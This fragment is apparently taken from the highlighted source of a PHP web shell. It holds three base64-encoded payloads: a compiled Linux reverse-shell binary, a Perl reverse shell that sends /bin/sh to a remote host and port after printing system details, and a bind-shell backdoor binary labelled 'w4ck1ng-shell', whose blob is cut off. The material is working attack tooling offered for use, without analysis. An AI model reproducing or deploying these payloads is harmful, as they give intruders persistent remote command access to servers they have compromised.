    <span class="nv">$back_connect_c</span><span class="o">=</span><span class="s2">&quot;f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAA2IUECDQAAABMDAAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQILAkAACwJAAAFAAAAABAAAAEAAAAsCQAALJkECCyZBAg4AQAAPAEAAAYAAAAAEAAAAgAAAEAJAABAmQQIQJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAABQAAABEAAAAUAAAAAAAAAAAAAAARAAAAEgAAAAcAAAAKAAAACwAAAAgAAAAPAAAAAwAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAABgAAAAAAAAABAAAAAAAAAAkAAAAAAAAADAAAAAAAAAAAAAAADQAAAA4AAAACAAAABAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAAAAAABwBAAASAAAArAAAAAAAAABxAAAAEgAAADwAAAAAAAAACwIAABIAAABIAAAAAAAAAH0AAAASAAAAjAAAAAAAAACsAQAAEgAAAKUAAAAAAAAArwAAABIAAABjAAAAAAAAACcAAAASAAAAkwAAAAAAAADdAAAAEgAAAEMAAAAAAAAAOgAAABIAAABcAAAAAAAAAKoBAAASAAAAVgAAAAAAAAA2AAAAEgAAAHMAAAAAAAAA2QAAABIAAAB4AAAAAAAAACgAAAASAAAAbQAAAAAAAAAOAAAAEgAAAC4AAAAAAAAAeAAAABIAAAB9AAAA8IgECAQAAAARAA4ATwAAAAAAAAA5AAAAEgAAAAEAAAAAAAAAAAAAACAAAAAVAAAAAAAAAAAAAAAgAAAAAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AGNvbm5lY3QAZXhlY2wAcGVycm9yAGR1cDIAc3lzdGVtAHNvY2tldABiemVybwBzdHJjYXQAaW5ldF9hZGRyAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABkYWVtb24AX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAGNsb3NlAEdMSUJDXzIuMAAAAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAEAAgAAAAAAAQABACQAAAAQAAAAAAAAABBpaQ0AAAIAsgAAAAAAAAAImgQIBhMAABiaBAgHAQAAHJoECAcCAAAgmgQIBwMAACSaBAgHBAAAKJoECAcFAAAsmgQIBwYAADCaBAgHBwAANJoECAcIAAA4mgQIBwkAADyaBAgHCgAAQJoECAcLAABEmgQIBwwAAEiaBAgHDQAATJoECAcOAABQmgQIBw8AAFSaBAgHEQAAVYnlg+wI6EEBAADolAEAAOjnAwAAycMA/zUQmgQI/yUUmgQIAAAAAP8lGJoECGgAAAAA6eD/////JRyaBAhoCAAAAOnQ/////yUgmgQIaBAAAADpwP////8lJJoECGgYAAAA6bD/////JSiaBAhoIAAAAOmg/////yUsmgQIaCgAAADpkP////8lMJoECGgwAAAA6YD/////JTSaBAhoOAAAAOlw/////yU4mgQIaEAAAADpYP////8lPJoECGhIAAAA6VD/////JUCaBAhoUAAAAOlA/////yVEmgQIaFgAAADpMP////8lSJoECGhgAAAA6SD/////JUyaBAhoaAAAAOkQ/////yVQmgQIaHAAAADpAP////8lVJoECGh4AAAA6fD+//8x7V6J4YPk8FBUUmhoiAQIaBSIBAhRVmiAhgQI6E/////0kJBVieVT6AAAAABbgcMHFAAAUouD/P///4XAdAL/0FhbycOQkJBVieWD7AiAPWSaBAgAdA/rH412AIPABKNgmgQI/9KhYJoECIsQhdJ168YFZJoECAHJw4n2VYnlg+wIoTyZBAiFwHQZuAAAAACFwHQQg+wMaDyZBAj/0IPEEI12AMnDkJBVieVXVlOD7EyD5PC4AAAAAIPAD4PAD8HoBMHgBCnEjX2ovvSIBAj8uQcAAADzpI19r/y5DgAAALAA86qD7AhqAGoB6FD+//+DxBBmx0XIAgCD7AyLRQyDwAj/MOi3/v//g8QQD7fAg+wMUOi4/v//g8QQZolFyoPsDItFDIPABP8w6DH+//+D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EgAAAFwCAAAAAAAAKAAAABIAAABsAgAAZJoECAAAAAAQAPH/cwIAAAyaBAgAAAAAEQAVAIkCAABomgQIAAAAABAA8f+OAgAAAAAAAA4AAAASAAAAnwIAAAAAAAB4AAAAEgAAALICAAAsmQQIAAAAABAC8f/FAgAA8IgECAQAAAARAA4A1AIAAFiaBAgAAAAAEAAWAOECAAAAAAAAOQAAABIAAADzAgAAAAAAAAAAAAAgAAAABwMAACyZBAgAAAAAEALx/x0DAAAAAAAAAAAAACAAAAAAY2FsbF9nbW9uX3N0YXJ0AGNydHN0dWZmLmMAX19DVE9SX0xJU1RfXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBwLjAAY29tcGxldGVkLjEAX19kb19nbG9iYWxfZHRvcnNfYXV4AGZyYW1lX2R1bW15AF9fQ1RPUl9FTkRfXwBfX0RUT1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgAYmFjay5jAGV4ZWNsQEBHTElCQ18yLjAAX0RZTkFNSUMAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAX19maW5pX2FycmF5X2VuZABfX2Rzb19oYW5kbGUAX19saWJjX2NzdV9maW5pAHN5c3RlbUBAR0xJQkNfMi4wAF9pbml0AGRhZW1vbkBAR0xJQkNfMi4wAF9zdGFydABzdHJsZW5AQEdMSUJDXzIuMABfX2ZpbmlfYXJyYXlfc3RhcnQAX19saWJjX2NzdV9pbml0AGluZXRfYWRkckBAR0xJQkNfMi4wAF9fYnNzX3N0YXJ0AG1haW4AX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfZW5kAGR1cDJAQEdMSUJDXzIuMABzdHJjYXRAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AF9maW5pAF9fcHJlaW5pdF9hcnJheV9lbmQAYnplcm9AQEdMSUJDXzIuMABleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2VuZABodG9uc0BAR0xJQkNfMi4wAGNvbm5lY3RAQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfc3RhcnQAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZ21vbl9zdGFydF9fAA==&quot;</span><span class="p">;</span>
     
    <span class="nv">$back_connect</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiOyc7DQokc3lzdGVtMT0gJ2VjaG8gImBpZGAiOyc7DQokc3lzdGVtMj0gJ2VjaG8gImBwd2RgIjsnOw0KJHN5c3RlbTM9ICdlY2hvICJgd2hvYW1pYEBgaG9zdG5hbWVgOn4gPiI7JzsNCiRzeXN0ZW00PSAnL2Jpbi9zaCc7DQokMD0kY21kOw0KJHRhcmdldD0kQVJHVlswXTsNCiRwb3J0PSRBUkdWWzFdOw0KJGlhZGRyPWluZXRfYXRvbigkdGFyZ2V0KSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOw0KcHJpbnQgIlxuXG46OiB3NGNrMW5nLXNoZWxsIChQcml2YXRlIEJ1aWxkIHYwLjMpIHJldmVyc2Ugc2hlbGwgOjpcblxuIjsNCnByaW50ICJcblN5c3RlbSBJbmZvOiAiOyANCnN5c3RlbSgkc3lzdGVtKTsNCnByaW50ICJcbllvdXIgSUQ6ICI7IA0Kc3lzdGVtKCRzeXN0ZW0xKTsNCnByaW50ICJcbkN1cnJlbnQgRGlyZWN0b3J5OiAiOyANCnN5c3RlbSgkc3lzdGVtMik7DQpwcmludCAiXG4iOw0Kc3lzdGVtKCRzeXN0ZW0zKTsgc3lzdGVtKCRzeXN0ZW00KTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span><span class="p">;</span>
     
    <span class="nv">$backdoor</span><span class="o">=</span><span class="s2">&quot;f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAA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